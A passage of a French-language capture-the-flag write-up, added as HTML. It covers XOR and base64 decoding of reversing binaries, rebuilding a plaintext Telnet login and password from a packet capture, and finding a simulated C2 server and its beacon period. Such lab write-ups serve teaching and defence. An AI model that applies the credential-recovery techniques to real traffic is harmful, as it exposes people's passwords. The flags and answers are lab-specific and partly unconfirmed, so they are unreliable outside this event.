+Un ELF 64 bits, <strong>PIE</strong> (position independent executable), dynamiquement lié, strippé. PIE veut dire que les adresses ne sont pas fixes au moment de la compilation : au chargement, le binaire est relocalisé à une adresse de base aléatoire. Ça ne change rien pour l'analyse statique (les offsets dans le fichier restent les mêmes) mais ça m'a rappelé de ne pas me fier aux adresses virtuelles affichées par un désassembleur sans vérifier qu'elles correspondent bien à des offsets fichier.
+</p>
+
+<h3 class="subsection-title">2. Repérer le tableau chiffré</h3>
+<p>Comme pour Reversing Easy, j'ai commencé par les strings, mais cette fois ça n'a rien donné de lisible, logique, puisque les données sont XORées et ne ressemblent donc à aucun texte. Il fallait aller regarder <code>.rodata</code> directement :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>readelf -S 02_xor_obfusc | grep -A1 rodata
+objdump -s -j .rodata 02_xor_obfusc</pre>
+</div>
+<p>
+Ça m'a donné le contenu brut de la section, avec les offsets. J'ai repéré un tableau de 15-16 octets qui ne formait aucune suite de caractères imprimables, signe qu'il était bien chiffré.
+</p>
+
+<h3 class="subsection-title">3. Trouver la clé</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>objdump -d -M intel -j .text 02_xor_obfusc | grep -A3 -B3 xor</pre>
+</div>
+<p>
+J'ai cherché l'instruction <code>xor</code> dans le désassemblage de <code>main</code>. Elle apparaît sous la forme <code>xor eax, 0x5a</code> (ou <code>xor BYTE PTR [rax], 0x5a</code> selon la version du binaire), la clé est en dur dans le code, en immédiat, directement visible dans l'instruction.
+</p>
+
+<h3 class="subsection-title">4. Décoder</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>d = bytes.fromhex("...")  # le tableau extrait de .rodata
+key = 0x5a
+print(bytes(b ^ key for b in d))</pre>
+</div>
+<p>
+Premier résultat obtenu : <code>aluEn[ceelJlflb</code>. Ce n'était clairement pas un flag, pas de <code>FLAG{</code>, aucune structure lisible de bout en bout. Deux hypothèses à ce stade : soit je m'étais trompé de clé ou de tableau, soit le binaire lui-même était défectueux.
+</p>
+
+<h3 class="subsection-title">5. Erreur : s'acharner sur la mauvaise piste avant de douter du fichier</h3>
+<p>
+J'ai passé pas mal de temps à vérifier ma propre méthode : re-brute-forcer les 256 clés possibles, tester XOR avec un index variable, ROL/ROR, addition/soustraction au lieu du XOR, inverser l'ordre des octets… Rien ne donnait de résultat plus convaincant que <code>aluEn[ceelJlflb</code>. J'ai fini par conclure que l'extraction était correcte et que le problème venait du binaire distribué, pas de la méthode. Soumis plusieurs fois (<code>aluEn[ceelJlflb</code>, puis <code>FLAG{aluEn[ceelJlflb}</code>) : toujours refusé.
+</p>
+<p>
+Ce qui a confirmé le diagnostic : un autre défi (Reversing Easy) donnait lui aussi un flag vérifié mais refusé par la plateforme, alors que d'autres défis du CTF étaient déjà validés par d'autres joueurs. Ça pointait vers un problème spécifique à ce challenge plutôt qu'un souci général de la plateforme, probablement un flag mal synchronisé avec le binaire publié, une erreur fréquente côté auteurs de CTF quand un challenge est régénéré après son premier déploiement.
+</p>
+
+<h3 class="subsection-title">6. Le binaire a été remplacé par les organisateurs</h3>
+<p>
+Le défi est repassé de 100 à 150 points et le nombre de résolutions est passé à 39 d'un coup : signe que les organisateurs avaient corrigé le problème. Un nouveau fichier <code>02_xor_obfusc__1_</code> a été fourni, avec un hash différent du premier.
+</p>
+<p>
+J'ai reconnu les mêmes erreurs à ne pas refaire : repartir de zéro, vérifier le hash avant de réanalyser (<code>sha256sum</code>), et ne pas supposer que c'était le même fichier.
+</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>objdump -d -M intel -j .text 02_xor_obfusc__1_ | grep -A3 -B3 xor
+objdump -s -j .rodata 02_xor_obfusc__1_</pre>
+</div>
+<p>
+Même clé, <code>0x5a</code>, mais un tableau différent en <code>.rodata</code> : <code>1c 16 1b 1d 21 22 6a 28 05 33 29 05 3c 2f 34 27</code>. Le XOR donne cette fois <code>FLAG{x0r_is_fun}</code>, un résultat parfaitement lisible, avec la structure attendue.
+</p>
+
+<h3 class="subsection-title">7. Vérification finale</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>./02_xor_obfusc__1_</pre>
+</div>
+<p>Le binaire affiche directement <code>Decoded: FLAG{x0r_is_fun}</code>, confirmant le calcul.</p>
+
+<h3 class="subsection-title">Résumé</h3>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Étape</th><th>Outil</th><th>Résultat</th></tr></thead>
+<tbody>
+<tr><td>Identifier le binaire</td><td><code>file</code></td><td>ELF 64 bits PIE, strippé</td></tr>
+<tr><td>Localiser la section chiffrée</td><td><code>readelf -S</code>, <code>objdump -s -j .rodata</code></td><td>tableau d'octets non lisible</td></tr>
+<tr><td>Trouver la clé</td><td><code>objdump -d -M intel -j .text</code> + recherche de <code>xor</code></td><td>clé <code>0x5a</code> en dur dans main</td></tr>
+<tr><td>Décoder</td><td>script Python (XOR octet à octet)</td><td>v1 : binaire défectueux → v2 : <code>FLAG{x0r_is_fun}</code></td></tr>
+<tr><td>Vérifier</td><td>exécution directe</td><td>Decoded: FLAG{x0r_is_fun}</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="flag-box">
+<div class="flag-label">Flag final</div>
+<div class="flag-text">FLAG{x0r_is_fun}</div>
+</div>
+
+<div class="def-box">
+<div class="def-term">Enseignement principal</div>
+<div class="def-body">
+Quand une méthode solide donne un résultat incohérent de façon répétée, et que d'autres indices (d'autres défis cassés sur la même plateforme) vont dans le même sens, il vaut mieux suspecter <strong>le fichier source</strong> que de continuer à tester des dizaines de variantes de décodage sans fin.
+</div>
+</div>
+</section>
+
+<!-- ═══════════════════════════ SECTION 03 ═══════════════════════════ -->
+<section class="section" id="s3">
+<div class="section-label">Reversing <span>· 10 pts</span></div>
+<h2 class="section-title">Brend new String Easy</h2>
+<div class="status-badges">
+<span class="pill pill-amber">⚠️ Statut jamais confirmé</span>
+<span class="pill pill-purple">Reversing</span>
+<span class="pill pill-blue">base64</span>
+</div>
+<p>
+Un nouveau binaire <code>01_strings_easy_v2</code> est fourni, avec comme seule description : « C'est du tout cuit ». Pas d'énoncé technique précis, juste un titre qui ressemble à une variante de Reversing Easy, et un indice implicite dans le nom (« Brend new » = « Brand new », tout nouveau).
+</p>
+<div class="warn-badge">
+Je précise d'entrée : je n'ai jamais eu de confirmation que la valeur proposée était la bonne. Ce write-up documente la méthode et le résultat obtenu, pas une victoire certaine.
+</div>
+
+<h3 class="subsection-title">1. Réflexe n°1 : comparer avec l'ancien binaire</h3>
+<p>Comme le nom ressemblait beaucoup à <code>01_strings_easy</code>, déjà résolu, j'ai tout de suite comparé les deux fichiers plutôt que de repartir de zéro :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>sha256sum 01_strings_easy 01_strings_easy_v2</pre>
+</div>
+<p>
+Les hashes étaient différents : ce n'était donc pas une simple redistribution du même fichier, mais un binaire réellement modifié. Bon réflexe à avoir systématiquement sur un CTF : avant de recommencer toute une analyse, vérifier si le fichier a vraiment changé.
+</p>
+
+<h3 class="subsection-title">2. Repartir de la méthode qui avait marché</h3>
+<p>Comme pour l'original, la bonne approche sur un challenge « strings easy » est de commencer par chercher le texte en clair avant de désassembler quoi que ce soit :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>file 01_strings_easy_v2
+strings -a -t x 01_strings_easy_v2</pre>
+</div>
+<p>Le binaire était de nouveau strippé, ELF 64 bits PIE. Dans la sortie de <code>strings</code>, les chaînes de l'ancien défi étaient toujours présentes à l'identique :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Chaînes identiques à la v1</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.75rem;line-height:1.7;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">2004 Enter password: 
+2017 Wrong
+2020 Correct! FLAG{simple_password_crack}
+2050 open_sesame_2025</pre></div>
+<div class="terminal-caption">Aucune différence visible à ce niveau.</div>
+</div>
+<p>À première vue, rien de nouveau, mêmes offsets, même contenu. J'ai vérifié en exécutant le binaire avec l'ancien mot de passe :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>echo "open_sesame_2025" | ./01_strings_easy_v2
+# Enter password: Correct! FLAG{simple_password_crack}</pre>
+</div>
+<p>
+Ça fonctionnait encore, mais ce n'était clairement pas le nouveau contenu attendu pour un défi distinct à 10 points, sinon pourquoi créer un binaire différent avec le même flag ?
+</p>
+
+<h3 class="subsection-title">3. Erreur : s'arrêter trop tôt sur les sections standards</h3>
+<p>
+Mon premier passage avec <code>strings</code> n'avait listé que les sections ELF classiques (.text, .rodata, .dynsym, etc.) sans rien remarquer d'anormal. Si je m'étais arrêté là, j'aurais manqué la différence. Le bon réflexe a été de lister <strong>toutes</strong> les sections du binaire, pas seulement celles qu'on attend dans un ELF standard :
+</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>readelf -S -W 01_strings_easy_v2</pre>
+</div>
+<p>
+Une section supplémentaire est apparue, absente de l'ancien binaire : <code>.arch</code>, à l'offset <code>0x3057</code>. Un nom de section personnalisé comme celui-là est un signal fort, une section standard générée par le compilateur ne s'appelle jamais <code>.arch</code>. C'était clairement ajouté exprès par les organisateurs.
+</p>
+
+<h3 class="subsection-title">4. Extraire et décoder le contenu de .arch</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>strings -a -t x 01_strings_easy_v2 | grep -A1 arch</pre>
+</div>
+<p>
+Le contenu de cette section était : <code>RmxhZ3tBcmNoX3g4Nl82NH0=</code>. La terminaison en <code>=</code> et l'alphabet utilisé (lettres, chiffres, pas de caractères spéciaux hors /+=) sont la signature typique du base64. Décodage :
+</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>echo "RmxhZ3tBcmNoX3g4Nl82NH0=" | base64 -d</pre>
+</div>
+<p>
+Résultat : <code>Flag{Arch_x86_64}</code>, un nom de flag cohérent avec le nom de la section (.arch) et avec l'architecture du binaire analysé plus tôt (file avait indiqué x86-64).
+</p>
+
+<h3 class="subsection-title">5. Ce qui restait incertain</h3>
+<p>Deux points de doute, jamais tranchés faute d'énoncé précis et de confirmation de la plateforme :</p>
+<ul class="plain">
+<li><strong>La casse du préfixe.</strong> Le flag décodé commence par <code>Flag{</code>, avec un F majuscule suivi de minuscules, différent du <code>FLAG{</code> tout en majuscules utilisé par les autres défis du CTF. Je l'ai gardé tel quel, en respectant exactement ce que donnait le décodage, plutôt que de le « corriger » en <code>FLAG{Arch_x86_64}</code> sans certitude.</li>
+<li><strong>Pas d'énoncé technique.</strong> Sans description claire du défi (juste « C'est du tout cuit »), je n'ai pas pu confirmer que la section <code>.arch</code> était bien le point d'entrée attendu, même si c'était la seule nouveauté détectable dans le binaire.</li>
+</ul>
+
+<h3 class="subsection-title">Résumé</h3>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Étape</th><th>Outil</th><th>Résultat</th></tr></thead>
+<tbody>
+<tr><td>Comparer avec l'ancien binaire</td><td><code>sha256sum</code></td><td>fichier différent</td></tr>
+<tr><td>Chercher les chaînes visibles</td><td><code>strings -a -t x</code></td><td>anciennes chaînes encore présentes, rien de neuf</td></tr>
+<tr><td>Lister toutes les sections ELF</td><td><code>readelf -S -W</code></td><td>section inhabituelle .arch détectée</td></tr>
+<tr><td>Extraire son contenu</td><td><code>strings</code> ciblé sur .arch</td><td>chaîne encodée en base64</td></tr>
+<tr><td>Décoder</td><td><code>base64 -d</code></td><td><code>Flag{Arch_x86_64}</code></td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="flag-box">
+<div class="flag-label">Valeur proposée (jamais confirmée)</div>
+<div class="flag-text">Flag{Arch_x86_64}</div>
+</div>
+
+<div class="def-box">
+<div class="def-term">Enseignement principal</div>
+<div class="def-body">
+Sur un binaire qui semble être une simple variante d'un défi déjà résolu, ne pas se contenter de retrouver les mêmes chaînes qu'avant. Comparer systématiquement la <strong>liste complète des sections</strong> entre les deux versions permet de repérer ce qui a été ajouté, même quand le contenu visible en surface (strings brut) n'a pas changé.
+</div>
+</div>
+</section>
+
+<!-- ═══════════════════════════ SECTION 04 ═══════════════════════════ -->
+<section class="section" id="s4">
+<div class="section-label">Network <span>· 10 pts</span></div>
+<h2 class="section-title">SSH vs Telnet</h2>
+<div class="status-badges">
+<span class="pill pill-red">❌ Non résolu</span>
+<span class="pill pill-blue">Network</span>
+<span class="pill pill-amber">PCAP</span>
+</div>
+<p>
+Un fichier <code>capture.pcap</code> est fourni. Énoncé : « Retrouve le flag dans la capture et complète-le ». Deux likes, zéro dislike, signe que d'autres joueurs avaient trouvé le défi correct, donc le problème venait très probablement de ma réponse, pas du challenge lui-même.
+</p>
+
+<h3 class="subsection-title">1. Identifier le format de la capture</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>file capture.pcap</pre>
+</div>
+<p>
+Un fichier pcap, mais avec un détail important : <strong>Linux cooked v2</strong> (linktype 276), pas de l'Ethernet classique. C'est le format utilisé quand la capture a été faite sur une interface <code>any</code> sous Linux plutôt que sur une interface réseau physique précise. Erreur à éviter ici : parser les en-têtes comme si c'était de l'Ethernet standard, la structure de l'en-tête de couche liaison n'a pas la même taille, et confondre les deux aurait décalé toute la lecture des paquets IP.
+</p>
+
+<h3 class="subsection-title">2. Cartographier les flux</h3>
+<p>Avec un parseur Python écrit à la main (toujours faute de tshark), j'ai reconstruit les flux TCP/UDP et compté les paquets par port :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Répartition des paquets</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.75rem;line-height:1.7;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">port 22  (SSH)     : ~1900 paquets
+port 23  (Telnet)  : ~112 paquets
+port 8000 (HTTP)   : ~70 paquets</pre></div>
+<div class="terminal-caption">Trois services distincts dans la capture.</div>
+</div>
+<p>
+Le nom du défi (« SSH vs Telnet ») donnait déjà la piste : le SSH est chiffré, donc illisible, et le Telnet transmet tout en clair. La bonne approche était de comparer les deux pour comprendre le message du challenge, probablement une leçon de sécurité réseau (Telnet expose tout, y compris les mots de passe), et de voir où le flag se cachait concrètement.
+</p>
+
+<h3 class="subsection-title">3. Reconstituer la session Telnet</h3>
+<p>Le protocole Telnet mélange des octets de négociation (séquences IAC, commençant par 0xFF) avec les données réellement tapées par l'utilisateur. Il a fallu filtrer ces séquences de contrôle pour ne garder que le texte utile :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>def strip_iac(data):
+    # retire les séquences IAC (0xFF suivi de codes de négociation)
+    ...</pre>
+</div>
+<p>En séparant les paquets client vers serveur des paquets serveur vers client, j'ai reconstitué la session complète :</p>
+<ul class="plain">
+<li><strong>Login :</strong> <code>mouna</code> (tapé lettre par lettre, avec des délais réalistes entre chaque caractère)</li>
+<li><strong>Mot de passe</strong> demandé, saisi d'un coup en un seul paquet (donc probablement collé, pas tapé) : <code>891c5feef171da85aadd3fdb8130ba509b03f5ea</code></li>
+<li><strong>Une fois connecté :</strong> commandes <code>ls</code> affichant deux éléments, <code>secret.enc</code> et le dossier <code>snap</code></li>
+</ul>
+
+<h3 class="subsection-title">4. Trouver le port HTTP et le flag « gabarit »</h3>
+<p>Le port 8000 montrait des requêtes <code>GET /flag.txt</code>. J'ai réassemblé la réponse complète octet par octet (en faisant bien attention à recoller les paquets dans l'ordre et à ne couper qu'au bon endroit, après le <code>\r\n\r\n</code> qui sépare les en-têtes HTTP du corps) :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>head, body = data.split(b'\r\n\r\n', 1)</pre>
+</div>
+<p>Le corps exact, confirmé par le <code>Content-Length: 80</code> de l'en-tête, était :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Flag gabarit distribué par le serveur</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.75rem;line-height:1.7;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">Flag{ I_Told_You_To_Stop_Using_This_Damn_Telnet_Mai_[mot de passe du telnet ] }</pre></div>
+<div class="terminal-caption">Le serveur distribue littéralement un gabarit à trous.</div>
+</div>
+<p>
+Un flag « à trous » : le serveur distribuait littéralement un gabarit, avec un espace réservé entre crochets, au lieu du flag final. Il fallait le compléter avec le mot de passe Telnet trouvé à l'étape précédente.
+</p>
+
+<h3 class="subsection-title">5. Construire le flag final, et le point resté incertain</h3>
+<p>J'ai remplacé <code>[mot de passe du telnet ]</code> par <code>891c5feef171da85aadd3fdb8130ba509b03f5ea</code>, en proposant deux variantes sur la gestion des espaces :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Deux variantes testées</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>Flag{I_Told_You_To_Stop_Using_This_Damn_Telnet_Mai_891c5feef171da85aadd3fdb8130ba509b03f5ea}
+Flag{ I_Told_You_To_Stop_Using_This_Damn_Telnet_Mai_891c5feef171da85aadd3fdb8130ba509b03f5ea }</pre>
+</div>
+<p>
+La première a été soumise et marquée <strong>incorrecte</strong>. Le CTF s'est terminé avant d'avoir pu confirmer la seconde ou explorer d'autres pistes.
+</p>
+
+<h3 class="subsection-title">6. Ce qui n'a pas été vérifié</h3>
+<p>Avec le recul, plusieurs pistes n'ont pas été creusées avant la fin du temps imparti :</p>
+<ul class="plain">
+<li><code>secret.enc</code>, vu dans le <code>ls</code> pendant la session Telnet, n'a jamais été récupéré ni analysé. Avec deux likes sur ce défi et aucune résolution confirmée de mon côté, il est possible que le vrai chemin passait par le déchiffrement de ce fichier avec le mot de passe Telnet comme clé, plutôt que par une simple substitution de texte dans le gabarit HTTP.</li>
+<li>Je n'ai pas vérifié si <code>secret.enc</code> circulait quelque part dans la capture (transfert SCP sur le port 22, par exemple), le trafic SSH restant chiffré et illisible avec les outils utilisés.</li>
+<li>La casse ou le format exact du flag (avec/sans espaces dans les accolades) n'a été testé qu'à moitié.</li>
+</ul>
+
+<h3 class="subsection-title">Résumé</h3>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Étape</th><th>Outil</th><th>Résultat</th></tr></thead>
+<tbody>
+<tr><td>Identifier le format de capture</td><td><code>file</code></td><td>Linux cooked v2 (linktype 276)</td></tr>
+<tr><td>Cartographier les flux</td><td>parseur Python manuel</td><td>SSH chiffré, Telnet en clair, HTTP sur port 8000</td></tr>
+<tr><td>Reconstituer la session Telnet</td><td>filtrage des séquences IAC</td><td>login <code>mouna</code>, mot de passe <code>891c5fe...</code></td></tr>
+<tr><td>Extraire le flag gabarit</td><td>réassemblage HTTP exact</td><td><code>Flag{ ... Mai_[mot de passe du telnet ] }</code></td></tr>
+<tr><td>Compléter le flag</td><td>substitution</td><td><code>Flag{...Mai_891c5f...}</code> → incorrect</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="danger-badge">
+Valeur proposée (refusée) : <code>Flag{I_Told_You_To_Stop_Using_This_Damn_Telnet_Mai_891c5feef171da85aadd3fdb8130ba509b03f5ea}</code>
+</div>
+
+<div class="def-box">
+<div class="def-term">Enseignement principal</div>
+<div class="def-body">
+Face à un flag « à trous » complété par un mot de passe trouvé ailleurs dans la capture, il ne faut pas s'arrêter à la première piste cohérente. Le <code>ls</code> révélait un indice supplémentaire (<code>secret.enc</code>) qui méritait d'être suivi jusqu'au bout avant de considérer l'enquête terminée.
+</div>
+</div>
+</section>
+
+<!-- ═══════════════════════════ SECTION 05 ═══════════════════════════ -->
+<section class="section" id="s5">
+<div class="section-label">Forensics <span>· 100 pts</span></div>
+<h2 class="section-title">C2 Server</h2>
+<div class="status-badges">
+<span class="pill pill-green">✅ Résolu</span>
+<span class="pill pill-blue">Forensics</span>
+<span class="pill pill-amber">tshark</span>
+</div>
+<p>
+<strong>Catégorie :</strong> Forensics / Réseau · <strong>Fichier fourni :</strong> <code>simulated_pcap.pcap</code> · <strong>Question :</strong> Quelle est l'adresse IP du serveur C2 ?
+</p>
+
+<h3 class="subsection-title">Démarche</h3>
+<p>
+Première étape classique en analyse forensique réseau : avoir une vue d'ensemble des échanges présents dans la capture avant de creuser dans le détail. <code>tshark</code> propose une statistique de conversations IP qui résume tout le trafic par paire d'hôtes :
+</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>tshark -r simulated_pcap.pcap -q -z conv,ip</pre>
+</div>
+<p>Résultat :</p>
+<div class="terminal-frame">
+<div class="terminal-bar">
+<div class="t-dot t-dot-red"></div>
+<div class="t-dot t-dot-amber"></div>
+<div class="t-dot t-dot-green"></div>
+<span class="terminal-bar-label">Conversations IPv4</span>
+</div>
+<div class="img-scroll"><pre style="padding:0.9rem 1rem;font-size:0.75rem;line-height:1.7;background:var(--code-bg);color:#c0cce8;margin:0;overflow-x:auto;">IPv4 Conversations
+Filter:&lt;No Filter&gt;
+10.0.0.5  &lt;-&gt; 198.51.100.45     53 paquets   4 987 bytes   durée 300.0372 s
+10.0.0.5  &lt;-&gt; 8.8.8.8           1 paquet     78 bytes      durée 0.0000 s</pre></div>
+<div class="terminal-caption">Deux conversations seulement.</div>
+</div>
+
+<h3 class="subsection-title">Analyse</h3>
+<p>Deux conversations seulement apparaissent dans la capture :</p>
+<ul class="plain">
+<li><strong>10.0.0.5 ↔ 8.8.8.8 :</strong> un seul paquet de 78 octets, typiquement une requête DNS isolée vers un résolveur public (Google DNS). Rien d'anormal, trafic légitime.</li>
+<li><strong>10.0.0.5 ↔ 198.51.100.45 :</strong> 53 paquets envoyés en continu sur toute la durée de la capture (300 secondes), avec une régularité marquée (Duration: 300.0372), ce qui est la signature classique d'un <strong>beaconing</strong> : une machine compromise qui « check in » périodiquement auprès d'un serveur de commande et contrôle (C2) pour recevoir des instructions.</li>
+</ul>
+<p>
+Le volume constant de petits paquets, la durée couvrant l'intégralité de la capture, et l'absence de toute autre activité réseau notable sur cette IP désignent clairement <code>198.51.100.45</code> comme le serveur C2, à l'inverse du DNS qui n'est qu'une requête ponctuelle et légitime.
+</p>
+
+<div class="flag-box">
+<div class="flag-label">IP du serveur C2</div>
+<div class="flag-text">198.51.100.45</div>
+</div>
+</section>
+
+<!-- ═══════════════════════════ SECTION 06 ═══════════════════════════ -->
+<section class="section" id="s6">
+<div class="section-label">Forensics <span>· 150 pts</span></div>
+<h2 class="section-title">Beacon</h2>
+<div class="status-badges">
+<span class="pill pill-red">❌ Non résolu</span>
+<span class="pill pill-blue">Forensics</span>
+<span class="pill pill-amber">PCAP</span>
+</div>
+<p>
+Un fichier <code>simulated_pcap.pcap</code> est fourni. Question : « Quelle est la période moyenne du beacon (en secondes) ? ». L'indice donnait la commande de départ :
+</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>tshark -r simulated_pcap.pcap -Y "udp && ip.src==10.0.0.5 && data contains \"BEACON\"" -T ...</pre>
+</div>
+<p>
+et précisait que la réponse devait être un décimal à 6 chiffres après la virgule (<code>x.xxxxxx</code>).
+</p>
+<div class="warn-badge">
+Ce write-up est honnête sur le résultat : je n'ai jamais réussi à faire valider ce défi, malgré plusieurs analyses indépendantes qui donnaient systématiquement la même réponse. Je le documente quand même, parce que la méthode reste correcte et utile, et parce que le vrai intérêt pédagogique ici est de montrer où ça a coincé.
+</div>
+
+<h3 class="subsection-title">1. Identifier le fichier</h3>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>file simulated_pcap.pcap</pre>
+</div>
+<p>
+Un fichier pcap classique (format libpcap, timestamps en microsecondes). Je n'avais pas <code>tshark</code> installé dans mon environnement, donc plutôt que de m'en passer, j'ai écrit un petit parseur Python du format pcap brut, header global de 24 octets, puis pour chaque paquet un header de 16 octets (timestamp seconde, timestamp microseconde, longueur capturée, longueur originale) suivi des données.
+</p>
+
+<h3 class="subsection-title">2. Filtrer les bons paquets</h3>
+<p>
+L'indice donnait le filtre exact à reproduire : paquets UDP, source 10.0.0.5, dont le contenu contient la chaîne BEACON. En reconstruisant les en-têtes Ethernet/IP/UDP à la main, j'ai extrait tous les paquets correspondants.
+</p>
+<p>
+Résultat : <strong>40 paquets</strong>, tous envoyés vers <code>198.51.100.45:443</code>, avec un payload du type <code>BEACON:1:...</code>, <code>BEACON:2:...</code>, etc., numérotés de 1 à 40, sans trou, et dans l'ordre chronologique. C'est un signal rassurant : la capture de paquets était cohérente et complète, rien ne manquait.
+</p>
+
+<h3 class="subsection-title">3. Calculer la période moyenne</h3>
+<p>
+Avec 40 paquets, on a 39 intervalles de temps entre deux beacons consécutifs. J'ai calculé les timestamps en arithmétique exacte (avec <code>Fraction</code>, pas en flottant) pour éviter toute erreur d'arrondi qui aurait pu décaler le 6e chiffre après la virgule, ce qui compte beaucoup vu le format de réponse demandé.
+</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Python</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>ts = [paquet.timestamp_exact for paquet in beacons]
+intervalles = [ts[i+1] - ts[i] for i in range(len(ts)-1)]
+moyenne = sum(intervalles) / len(intervalles)</pre>
+</div>
+<p>
+Résultat : <strong>5.000365 secondes</strong>, avec une durée totale de capture de 195.014252 s sur 39 intervalles. Les intervalles individuels allaient de 4.914 s à 5.073 s, un jitter cohérent avec un beacon censé battre toutes les 5 secondes avec un peu de bruit réseau.
+</p>
+
+<h3 class="subsection-title">4. Vérifier qu'il n'y avait pas d'erreur de ma part</h3>
+<p>Avant de conclure que le problème venait du challenge, j'ai testé systématiquement plusieurs variantes de calcul pour voir si l'une d'elles collait mieux avec ce que CTFd attendait :</p>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Variante testée</th><th>Résultat</th></tr></thead>
+<tbody>
+<tr><td>Moyenne sur les 39 intervalles (ma réponse)</td><td>5.000365</td></tr>
+<tr><td>Médiane des intervalles</td><td>5.001471</td></tr>
+<tr><td>Moyenne sans le premier intervalle</td><td>4.998841</td></tr>
+<tr><td>Moyenne sans le dernier intervalle</td><td>4.999908</td></tr>
+<tr><td>Moyenne sur tous les paquets UDP:443 (y compris non BEACON)</td><td>7.143743</td></tr>
+<tr><td>Moyenne sur tout le trafic UDP de 10.0.0.5</td><td>6.977610</td></tr>
+<tr><td><code>frame.time_delta_displayed</code> moyenné sur 40 paquets (premier = 0)</td><td>4.875356</td></tr>
+<tr><td><code>frame.time_delta</code> (paquet capturé précédent) sur 40</td><td>4.377574</td></tr>
+</tbody>
+</table>
+</div>
+<p>
+Cette dernière série venait d'une hypothèse précise : peut-être que l'auteur du challenge avait utilisé <code>tshark</code> avec une colonne du type <code>frame.time_delta_displayed</code>, où le premier paquet filtré a un delta de zéro (puisqu'il n'y a pas de paquet précédent dans l'affichage filtré). Si on moyenne sur 40 valeurs au lieu de 39 intervalles réels, en comptant ce zéro, on obtient 4.875356, c'est une erreur classique quand on calcule des statistiques avec <code>tshark -T fields -e frame.time_delta_displayed</code> sans retirer la première ligne.
+</p>
+
+<h3 class="subsection-title">5. Vérifier que le fichier n'avait pas changé</h3>
+<p>À chaque nouvelle tentative, j'ai recalculé le hash du fichier avant de refaire quoi que ce soit :</p>
+<div class="code-wrap">
+<div class="code-header"><span class="code-lang">Bash</span><button class="copy-btn" onclick="copyCode(this)">copier</button></div>
+<pre>sha256sum simulated_pcap.pcap</pre>
+</div>
+<p>
+Le hash (<code>8e60657155b34e1d...</code>) est resté identique sur 6 téléchargements successifs. Contrairement à Reversing &amp; Crypto, où les organisateurs avaient fini par publier un nouveau binaire corrigé, le fichier de Beacon n'a jamais changé. Ça m'a confirmé que retélécharger n'allait rien apporter de nouveau, toutes les analyses suivantes sur le même fichier donnaient forcément le même résultat.
+</p>
+
+<h3 class="subsection-title">6. Ce qui n'a pas été résolu</h3>
+<p>Aucune des valeurs testées (5.000365, 4.875356, 7.143743) n'a été acceptée par la plateforme. Le CTF s'est terminé sans que ce défi soit validé.</p>
+
+<h3 class="subsection-title">Résumé</h3>
+<div class="table-wrap">
+<table>
